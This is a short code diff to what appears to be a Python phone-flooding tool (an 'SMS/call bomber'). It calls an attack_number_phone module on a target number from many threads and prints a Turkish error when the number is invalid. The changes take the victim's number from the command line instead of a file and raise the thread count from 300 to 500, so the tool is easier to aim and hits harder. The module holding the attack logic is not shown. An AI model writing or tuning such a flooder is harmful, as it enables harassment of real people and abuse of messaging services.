@@ -13,8 +13,7 @@ def start(phone):
 		except Exception as ex:
 			print(ex)
 
-file = open ("numara.txt", 'r')
-phone = file.read()
+phone = sys.argv[1]
 
 try:
 	attack_number_phone.phone(phone)
@@ -22,6 +21,7 @@ except:
 	print(Fore.RED + 'НATALI NUMARA GİRİLDİ')
 	sys.exit()
 
-for i in range(300):
+for i in range(500):
     th = Thread(target=start, args=(phone, ))
     th.start()
+
